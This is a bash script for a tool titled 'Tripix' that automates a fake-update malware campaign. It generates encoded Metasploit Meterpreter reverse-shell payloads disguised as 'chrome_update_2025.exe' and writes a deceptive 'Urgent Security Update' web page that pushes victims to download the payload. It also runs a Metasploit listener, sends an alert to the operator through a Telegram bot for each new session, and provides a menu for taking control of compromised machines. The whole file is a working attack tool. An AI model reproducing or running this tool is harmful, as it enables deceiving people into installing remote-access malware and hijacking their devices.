#!/usr/bin/env bash
echo -e "\e[32m"
cat << "EOF"
                                               
,--------.         ,--.                        
'--.  .--' ,--.--. `--'  ,---.  ,--.  ,--.     
   |  |    |  .--' ,--. | .-. |  \  `'  /      
   |  |    |  |    |  | | '-' '  /  /.  \      
   `--'    `--'    `--' |  |-'  '--'  '--'     
                        `--'                   
EOF
echo -e "\e[0m"

set -e

# ======= Variables =======
CONFIG_FILE="config.cfg"
LOG_DIR="logs"
PAYLOAD_DIR="payload"
WEB_DIR="web"
SESSION_LOG="${LOG_DIR}/sessions.log"
ACTIVITY_LOG="${LOG_DIR}/activity.log"
HOOK_FILE="target_link.txt"
PORT=8000
FILENAME="chrome_update_2025.exe"

mkdir -p "${LOG_DIR}" "${PAYLOAD_DIR}" "${WEB_DIR}"
touch "$SESSION_LOG" "$ACTIVITY_LOG"
chmod +x "$SESSION_LOG" "$ACTIVITY_LOG"

# ======= Colors =======
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
RESET="\e[0m"

# ======= Function to log actions =======
log_action() {
  echo "[$(date '+%F %T')] $1" | tee -a "${ACTIVITY_LOG}"
}

# ======= Cleanup function =======
cleanup() {
  log_action "Cleaning up before exit..."
  echo -e "${YELLOW}Stopping background processes...${RESET}"

  # Kill background processes by their PIDs
  [[ -n "$HTTP_PID" ]] && kill "$HTTP_PID" 2>/dev/null
  [[ -n "$MSF_PID" ]] && kill "$MSF_PID" 2>/dev/null
  [[ -n "$TAIL_PID" ]] && kill "$TAIL_PID" 2>/dev/null

  log_action "Stopped all background processes."
  log_action "Tool exited"
  echo -e "${GREEN}Exited cleanly.${RESET}"
  exit 0
}

# ======= Trap signals =======
trap cleanup SIGINT SIGTERM EXIT

# ======= Load or create config =======
if [[ ! -f "$CONFIG_FILE" ]]; then
  echo -e "${YELLOW}First run: please enter your Telegram Bot Token:${RESET}"
  read -r TELEGRAM_TOKEN
  echo -e "TELEGRAM_TOKEN=${TELEGRAM_TOKEN}" > "${CONFIG_FILE}"
  echo -e "${YELLOW}Enter your Telegram Chat ID:${RESET}"
  read -r CHAT_ID
  echo "CHAT_ID=${CHAT_ID}" >> "${CONFIG_FILE}"
  log_action "Saved Telegram credentials to config"
fi

source "$CONFIG_FILE"

# ======= Check Dependencies =======
deps=(beef-xss msfconsole msfvenom python3 curl jq)
missing=0
for cmd in "${deps[@]}"; do
  if ! command -v "$cmd" &>/dev/null; then
    echo -e "${RED}Missing: $cmd${RESET}"
    missing=1
  fi
done

if [[ $missing -eq 1 ]]; then
  echo -e "${RED}Please install missing tools before running this script.${RESET}"
  exit 1
fi
log_action "All dependencies OK"

# ======= Payload Selection =======
echo -e "${BLUE}Select payload type:${RESET}"
options=("windows/meterpreter/reverse_tcp" "python/meterpreter/reverse_tcp" "android/meterpreter/reverse_tcp")
select PAYLOAD_TYPE in "${options[@]}"; do
  [[ -n "$PAYLOAD_TYPE" ]] && break
done
log_action "Payload: $PAYLOAD_TYPE"

# ======= LPORT input =======
echo -e "${BLUE}Enter listener port:${RESET}"
read -r LPORT
log_action "LPORT: $LPORT"

# ======= Detect public IP =======
PUBLIC_IP=127.0.0.1
log_action "Local IP: $PUBLIC_IP"

# ======= Payload generation =======
msfvenom -p "$PAYLOAD_TYPE" LHOST="$PUBLIC_IP" LPORT="$LPORT" -f exe -e x86/shikata_ga_nai -i 3 -o "${PAYLOAD_DIR}/${FILENAME}"
log_action "Payload created at ${PAYLOAD_DIR}/${FILENAME}"

# ======= Fake update page =======
cat <<EOF > "${WEB_DIR}/update.html"
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Critical Update</title>
  <style>
    body { font-family: Arial; background: #111; color: white; text-align: center; padding-top: 100px; }
    #downloadBtn {
      padding: 15px 30px; background: #ff0; border: none; border-radius: 10px;
      font-weight: bold; cursor: pointer; font-size: 1.2em;
    }
  </style>
</head>
<body>
  <h1>Urgent Security Update</h1>
  <p>Click the button below to download and install the latest security patch.</p>
  <button id="downloadBtn">Download Update</button>
  <script>
    document.getElementById("downloadBtn").onclick = function () {
      window.location.href = "http://${PUBLIC_IP}:${PORT}/${PAYLOAD_DIR}/${FILENAME}";
    };
  </script>
</body>
</html>
EOF
log_action "Fake update page created"

# ======= Serve & Handler =======
python3 -m http.server 8000 > "${LOG_DIR}/http.log" 2>&1 &
HTTP_PID=$!
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $PAYLOAD_TYPE; set LHOST 0.0.0.0; set LPORT $LPORT; set ExitOnSession false; exploit -j" > "${LOG_DIR}/msf.log" 2>&1 &
MSF_PID=$!
log_action "Servers running on port 8000"

# ======= Telegram session monitor =======
tail -F "${LOG_DIR}/msf.log" | while read -r line; do
  if echo "$line" | grep -q "Meterpreter session"; then
    SID=$(echo "$line" | grep -oE "meterpreter/[0-9]+" | cut -d'/' -f2)
    echo "New session: $SID" >> "$SESSION_LOG"
    log_action "New session: $SID"
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
      -d chat_id="${CHAT_ID}" \
      -d text="💥 New Meterpreter session: $SID"
  fi
done &
TAIL_PID=$!

# ======= Display victim link =======
TARGET_LINK="http://${PUBLIC_IP}:${PORT}/${WEB_DIR}/update.html"
echo -e "${GREEN}✔ Victim link: ${TARGET_LINK}${RESET}"
echo "$TARGET_LINK" > "$HOOK_FILE"
log_action "Victim link saved to ${HOOK_FILE}"

# ======= Session Interaction Loop =======
while true; do
  echo -e "${GREEN}\nSessions:${RESET}"
  nl -w2 -s". " "${SESSION_LOG}"
  echo -e "${BLUE}Type session number to interact or 'q' to quit:${RESET}"
  read -r choice
  [[ "$choice" == "q" ]] && break
  SID=$(sed -n "${choice}p" "${SESSION_LOG}")
  if [[ -n "$SID" ]]; then
    echo -e "${YELLOW}Attaching to session $SID...${RESET}"
    msfconsole -q -x "sessions -i $SID"
  else
    echo -e "${RED}Invalid selection${RESET}"
  fi
done

# نفذ التنظيف بعد الخروج من الحلقة
cleanup
